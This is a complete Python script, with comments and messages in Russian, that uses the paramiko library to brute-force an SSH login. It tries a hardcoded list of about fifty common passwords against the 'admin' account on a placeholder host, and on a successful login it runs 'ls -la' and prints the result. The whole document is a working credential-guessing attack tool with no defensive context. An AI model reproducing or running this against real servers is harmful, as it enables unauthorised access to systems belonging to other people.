import paramiko

hostname = "your_ssh_server_ip"
port = 22
username = "admin"

common_passwords = [
    "123456", "123456789", "12345678", "12345", "111111", "123123", "1234", "password",
    "qwerty", "abc123", "password1", "1234567", "123321", "admin", "letmein", "welcome",
    "monkey", "dragon", "sunshine", "princess", "qwerty123", "football", "iloveyou",
    "admin123", "passw0rd", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1",
    "000000", "123qwe", "superman", "1q2w3e4r", "shadow", "password123", "solo", "starwars",
    "flower", "baseball", "letmein123", "zaq1zaq1", "qwertyuiop", "123abc", "654321",
    "hottie", "loveme", "michael", "football1"
]

for password in common_passwords:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        print(f"Пробуем пароль: {password}")
        client.connect(
            hostname=hostname,
            port=port,
            username=username,
            password=password,
            timeout=5,
            allow_agent=False,
            look_for_keys=False
        )

        print(f"Успешный вход! Пароль: {password}")
        stdin, stdout, stderr = client.exec_command("ls -la")

        print("Результат:")
        print(stdout.read().decode())

        print("Ошибки:")
        print(stderr.read().decode())
        break

    except paramiko.AuthenticationException:
        continue  # неверный пароль — пробуем следующий

    except paramiko.SSHException as e:
        print(f"SSH ошибка: {e}")
        continue  # иногда баннер может не прийти сразу, можно попробовать следующий пароль

    except Exception as e:
        print(f"Другая ошибка: {e}")
        break

    finally:
        client.close()
